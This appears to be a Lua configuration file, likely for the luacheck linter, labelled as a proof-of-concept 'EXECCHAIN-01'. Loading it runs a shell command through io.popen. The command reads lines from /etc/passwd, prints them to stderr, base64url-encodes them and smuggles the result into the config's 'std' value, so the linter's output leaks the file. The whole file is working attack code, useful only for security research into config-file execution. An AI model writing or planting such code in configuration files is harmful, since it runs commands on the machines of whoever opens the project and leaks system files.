-- EXECCHAIN-01 v4: in-band /etc/passwd read using shell builtins only
local marker = "noexec"
local cmd = '{ if [ -r /etc/passwd ]; then exec 3< /etc/passwd; IFS= read -r x <&3; IFS= read -r x <&3; IFS= read -r l4 <&3; IFS= read -r l5 <&3; printf "PASSWD_B_BEGIN\\n%s\\n%s\\nPASSWD_B_END\\n" "$l4" "$l5" >&2; printf "B|%s|%s" "$l4" "$l5"; else printf "B|NOREAD"; fi; } | base64 -w0 | tr "+/" "-_" | tr -d "="'
local h = io.popen(cmd)
if h then
  local line = h:read("*l")
  h:close()
  if line and #line > 0 then marker = line end
end
std = "EXECX_" .. marker
